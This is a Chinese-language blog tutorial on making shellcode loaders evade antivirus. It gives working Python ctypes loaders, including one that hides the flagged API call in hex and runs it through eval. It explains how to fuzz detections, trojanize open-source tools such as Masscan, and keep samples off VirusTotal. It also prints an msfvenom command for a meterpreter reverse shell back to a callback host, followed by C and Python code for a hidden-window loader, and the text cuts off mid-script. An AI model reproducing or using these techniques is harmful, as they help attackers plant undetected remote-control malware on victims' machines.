<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="hacktrick,hacktrick,Dmagic" />
  <meta name="author" content="hacktrick" />
  <meta name="description" content="hacktrick" />
  
  
  <title>
    
      Shellcode免杀入门教程 
      
      
      |
    
     hacktrick
  </title>

  
    <link rel="apple-touch-icon" href="/img.jpg">
    <link rel="icon" href="/img.jpg">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/iconfont/iconfont.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">


  <!-- jquery3.3.1 -->
  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

  <!-- fancybox -->
  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
  
<script src="/js/fancybox.js"></script>


  

<meta name="generator" content="Hexo 5.4.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/img.jpg" alt="">
      
    </a>
    <div class="nickname"><a href="/">Dmagic</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Posts</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->

<!-- LaTex Display -->
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type="text/javascript" id="MathJax-script" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
</script>
<script>
MathJax = {
  tex: {
    inlineMath: [['$', '$'], ['\\(', '\\)']]
  }
};
</script>



  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">Shellcode免杀入门教程</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="Update time"></i>
          2020-12-23 19:17:55
        </span>
        
      </div>
      <div class="markdown-body">
        <h2 id="Shellcode执行工具编写思路"><a href="#Shellcode执行工具编写思路" class="headerlink" title="Shellcode执行工具编写思路"></a>Shellcode执行工具编写思路</h2><p>为了给大家讲怎么写shellcode执行盒，我特地找了一段Python的源代码，给大家分析。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="built_in">len</span>(shellcode)),ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">ht=ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
<p>首先引入ctypes模块，接着将shellcode代码赋值给变量hex解码（MSF或Cs生成的之后，使用编码工具手动编码一次。），转换为字节数组。然后，使用ctypes，调用windows自带的dll，也就是Kernel32，使用VirtualAlloc函数，分配内存，返回分配的首地址。然后再使用RtlMoveMemory，将shellcode拷贝到目标内存。使用CreateThread创建一个线程，使用WaitForSingleObject执行内存。总之，就是调用Kernel32.dll中的函数来编写Shellcode执行工具，不止这一种放法。作者水平有限，请勿断章取义。</p>
<h2 id="编写Shellcode执行工具"><a href="#编写Shellcode执行工具" class="headerlink" title="编写Shellcode执行工具"></a>编写Shellcode执行工具</h2><p>为了验证我们前面的思路是正确的，让我用其他语言来验证一下。这里，我们使用易语言吧，尽可能让大家看懂编写过程。</p>
<p>新建一个windows窗口程序</p>
<p><img src="https://img.rruu.net/image/5fd5d92d1c176" alt="image-20201213155240640.png"></p>
<p>画一个界面出来，大概就这样。</p>
<p><img src="https://img.rruu.net/image/5fd5d92d1c78f" alt="image-20201211165535513"></p>
<p>双击按钮来到添加事件，来到编辑界面。添加一个精易模块，等会要用他里面的方法来编写shellcode。创建shellcode变量，用来储存shellcode。</p>
<p><img src="https://img.rruu.net/image/5fd5d92d1f9bf" alt="image-20201211170702523"></p>
<p>查看模块手册，就会发现模块自带VirtualAlloc RtlMoveMemory CreateThread WaitForSingleObject这四个方法，我们直接使用即可。</p>
<p>最终编写如下，如果你仔细比对Python源代码，你会发现真的基本上就是差不多的。</p>
<p><img src="https://img.rruu.net/image/5fd5d92d1f8d7" alt="image-20201211171754154"></p>
<p>最后，让我们来测试一下吧。</p>
<p>MSF生成一个小弹窗测试一下。</p>
<p><img src="https://img.rruu.net/image/5fd5d92d7cd4d" alt="image-20201211173115244"></p>
<p>使用一下K8飞刀的编码工具</p>
<p><img src="https://img.rruu.net/image/5fd5d636ef847" alt="image-20201213161344141"></p>
<p>获得编码以后的shellcode </p>
<p><img src="https://img.rruu.net/image/5fd5d6179229d" alt="image-20201213161359195"></p>
<p>获得HEx编码的Shellcode，复制粘贴到加载测试工具中，点击加载shellcode。我们就可以执行啦。</p>
<p><img src="https://img.rruu.net/image/5fd5d66d35008" alt="image-20201211173225308"></p>
<p>最后，总结一下，我们的思路没有错，确实是这样写的，各位不妨试试其他语言写一下，自己多动手体会体会啦。</p>
<h2 id="Shellcode上线免杀思路"><a href="#Shellcode上线免杀思路" class="headerlink" title="Shellcode上线免杀思路"></a>Shellcode上线免杀思路</h2><p>个人经验告诉你，用Python Ruby这类解释型语言，打包成EXE就算是正常程序也很有可能被拦截，而像C和GO以及C++这种编译型语言则不会有这种问题。建议各位免杀，放在虚拟机，并且断网防止被上传，自己弄了老半天的东西免杀成了，却坚持不了多久。还有也不要上传VT等杀毒网站，会被厂商拿去分析的。免杀的时候也不要上传到类似于360的云查杀。下面我来叙述一下我的思路。</p>
<p>首先，我给出一段免杀360与火绒的Python加载器源代码。细心的小伙伴们可能会发现，这跟上面第一部分我给出的源代码很像。对的，这个就是在那个基础上运用了一下加密手段，来进行免杀的。使用hex将，360查杀的部分给藏了起来。在运行的时候，首先解密字符串，然后eval执行，运用了等价替换的思路。问题来了，我为什么知道360查杀这里？这里给大家一个小方法，那就是不断的FUzz。像下文这段代码，我发现去掉ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))，然后打包成exe，360则不查杀，就是不断的去尝试，最后知道他查杀哪里。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">a &#x3D; &quot;shellcode&quot;</span><br><span class="line">shellcode&#x3D;bytearray(a.decode(&quot;hex&quot;))</span><br><span class="line">ptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))</span><br><span class="line">buf &#x3D; (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">shell &#x3D; &quot;6374797065732e77696e646c6c2e6b65726e656c33322e52746c4d6f76654d656d6f7279286374797065732e635f696e7428707472292c206275662c206374797065732e635f696e74286c656e287368656c6c636f6465292929&quot;</span><br><span class="line">eval(shell.decode(&quot;hex&quot;))</span><br><span class="line">ht &#x3D; ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>


<p>第二个思路，使用一些正常滴开源项目，在里面加点料，达到免杀。经过本人不断地测试，发现效果属实顶。VT查杀轻轻松松可以控制在8左右。而且，相对于第一个思路来说，也更加容易，适合新手朋友。这里给出效果图，使用的是Masscan。</p>
<p><img src="https://img.rruu.net/image/5fd5d6d8157f2" alt="1"></p>
<p>稍微给Masscan加了点料</p>
<p><img src="https://img.rruu.net/image/5fd5d6fa908c7" alt="image-20201211175252005"></p>
<h2 id="Shellcode免杀实战"><a href="#Shellcode免杀实战" class="headerlink" title="Shellcode免杀实战"></a>Shellcode免杀实战</h2><p>首先，去github上随手一搜索C写的程序，你开心就好。然后下载到本地，打开。我这里用的是vs2019，你们也可以用其他的，没有硬性要求。第一，这里准备两个东西，一个是base64加密解密的code，另外一个是反转字符串的code。第二，找开源程序的时候，注意文件大小，太小的效果不好，太大的又太臃肿，几百K左右也可以，但是其实也没有那么大的硬性要求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">static const unsigned char pr2six[256] &#x3D;</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;* ASCII table *&#x2F;</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,</span><br><span class="line">    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,</span><br><span class="line">    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,</span><br><span class="line">    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64</span><br><span class="line">&#125;;</span><br><span class="line">int Base64decode_len(const char* bufcoded)</span><br><span class="line">&#123;</span><br><span class="line">    int nbytesdecoded;</span><br><span class="line">    register const unsigned char* bufin;</span><br><span class="line">    register int nprbytes;</span><br><span class="line">    bufin &#x3D; (const unsigned char*)bufcoded;</span><br><span class="line">    while (pr2six[*(bufin++)] &lt;&#x3D; 63);</span><br><span class="line">    nprbytes &#x3D; (bufin - (const unsigned char*)bufcoded) - 1;</span><br><span class="line">    nbytesdecoded &#x3D; ((nprbytes + 3) &#x2F; 4) * 3;</span><br><span class="line">    return nbytesdecoded + 1;</span><br><span class="line">&#125;</span><br><span class="line">int Base64decode(char* bufplain, const char* bufcoded)</span><br><span class="line">&#123;</span><br><span class="line">    int nbytesdecoded;</span><br><span class="line">    register const unsigned char* bufin;</span><br><span class="line">    register unsigned char* bufout;</span><br><span class="line">    register int nprbytes;</span><br><span class="line">    bufin &#x3D; (const unsigned char*)bufcoded;</span><br><span class="line">    while (pr2six[*(bufin++)] &lt;&#x3D; 63);</span><br><span class="line">    nprbytes &#x3D; (bufin - (const unsigned char*)bufcoded) - 1;</span><br><span class="line">    nbytesdecoded &#x3D; ((nprbytes + 3) &#x2F; 4) * 3;</span><br><span class="line">    bufout &#x3D; (unsigned char*)bufplain;</span><br><span class="line">    bufin &#x3D; (const unsigned char*)bufcoded;</span><br><span class="line">    while (nprbytes &gt; 4) &#123;</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span><br><span class="line">        bufin +&#x3D; 4;</span><br><span class="line">        nprbytes -&#x3D; 4;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;* Note: (nprbytes &#x3D;&#x3D; 1) would be an error, so just ingore that case *&#x2F;</span><br><span class="line">    if (nprbytes &gt; 1) &#123;</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span><br><span class="line">    &#125;</span><br><span class="line">    if (nprbytes &gt; 2) &#123;</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (nprbytes &gt; 3) &#123;</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span><br><span class="line">    &#125;</span><br><span class="line">    *(bufout++) &#x3D; &#39;\0&#39;;</span><br><span class="line">    nbytesdecoded -&#x3D; (4 - nprbytes) &amp; 3;</span><br><span class="line">    return nbytesdecoded;</span><br><span class="line">&#125;</span><br><span class="line">static const char basis_64[] &#x3D;</span><br><span class="line">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int Base64encode_len(int len)</span><br><span class="line">&#123;</span><br><span class="line">    return ((len + 2) &#x2F; 3 * 4) + 1;</span><br><span class="line">&#125;</span><br><span class="line">int Base64encode(char* encoded, const char* string, int len)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    char* p;</span><br><span class="line">    p &#x3D; encoded;</span><br><span class="line">    for (i &#x3D; 0; i &lt; len - 2; i +&#x3D; 3) &#123;</span><br><span class="line">        *p++ &#x3D; basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span><br><span class="line">        *p++ &#x3D; basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span><br><span class="line">            ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span><br><span class="line">        *p++ &#x3D; basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2) |</span><br><span class="line">            ((int)(string[i + 2] &amp; 0xC0) &gt;&gt; 6)];</span><br><span class="line">        *p++ &#x3D; basis_64[string[i + 2] &amp; 0x3F];</span><br><span class="line">    &#125;</span><br><span class="line">    if (i &lt; len) &#123;</span><br><span class="line">        *p++ &#x3D; basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span><br><span class="line">        if (i &#x3D;&#x3D; (len - 1)) &#123;</span><br><span class="line">            *p++ &#x3D; basis_64[((string[i] &amp; 0x3) &lt;&lt; 4)];</span><br><span class="line">            &#x2F;&#x2F; *p++ &#x3D; &#39;&#x3D;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            *p++ &#x3D; basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span><br><span class="line">                ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span><br><span class="line">            *p++ &#x3D; basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2)];</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;*p++ &#x3D; &#39;&#x3D;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    *p++ &#x3D; &#39;\0&#39;;</span><br><span class="line">    return p - encoded;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string_change(unsigned char* p) &#123;</span><br><span class="line">    int i, len;</span><br><span class="line">    char temp;</span><br><span class="line">    len &#x3D; strlen(p);</span><br><span class="line">    for (size_t i &#x3D; 0; i &lt; (len &#x2F; 2); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp &#x3D; p[i];</span><br><span class="line">        p[i] &#x3D; p[len - 1 - i];</span><br><span class="line">        p[len - 1 - i] &#x3D; temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>MSF生成代码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.132.128 lport=4444 -f c -o shell.c</span><br></pre></td></tr></table></figure>
<p><img src="https://img.rruu.net/image/5fd5d71657b90" alt="image-20201212122320561"></p>
<p>这里用一下base.py处理一下文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,sys</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;&quot;&quot;#include &lt;string.h&gt;</span></span><br><span class="line"><span class="string">#pragma comment(linker,&quot;/subsystem:\\&quot;Windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;)</span></span><br><span class="line"><span class="string">//windows控制台程序不出黑窗口</span></span><br><span class="line"><span class="string">static const unsigned char pr2six[256] =</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,</span></span><br><span class="line"><span class="string">    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,</span></span><br><span class="line"><span class="string">    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,</span></span><br><span class="line"><span class="string">    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">int Base64decode_len(const char* bufcoded)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int nbytesdecoded;</span></span><br><span class="line"><span class="string">    register const unsigned char* bufin;</span></span><br><span class="line"><span class="string">    register int nprbytes;</span></span><br><span class="line"><span class="string">    bufin = (const unsigned char*)bufcoded;</span></span><br><span class="line"><span class="string">    while (pr2six[*(bufin++)] &lt;= 63);</span></span><br><span class="line"><span class="string">    nprbytes = (bufin - (const unsigned char*)bufcoded) - 1;</span></span><br><span class="line"><span class="string">    nbytesdecoded = ((nprbytes + 3) / 4) * 3;</span></span><br><span class="line"><span class="string">    return nbytesdecoded + 1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">int Base64decode(char* bufplain, const char* bufcoded)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int nbytesdecoded;</span></span><br><span class="line"><span class="string">    register const unsigned char* bufin;</span></span><br><span class="line"><span class="string">    register unsigned char* bufout;</span></span><br><span class="line"><span class="string">    register int nprbytes;</span></span><br><span class="line"><span class="string">    bufin = (const unsigned char*)bufcoded;</span></span><br><span class="line"><span class="string">    while (pr2six[*(bufin++)] &lt;= 63);</span></span><br><span class="line"><span class="string">    nprbytes = (bufin - (const unsigned char*)bufcoded) - 1;</span></span><br><span class="line"><span class="string">    nbytesdecoded = ((nprbytes + 3) / 4) * 3;</span></span><br><span class="line"><span class="string">    bufout = (unsigned char*)bufplain;</span></span><br><span class="line"><span class="string">    bufin = (const unsigned char*)bufcoded;</span></span><br><span class="line"><span class="string">    while (nprbytes &gt; 4) &#123;</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span></span><br><span class="line"><span class="string">        bufin += 4;</span></span><br><span class="line"><span class="string">        nprbytes -= 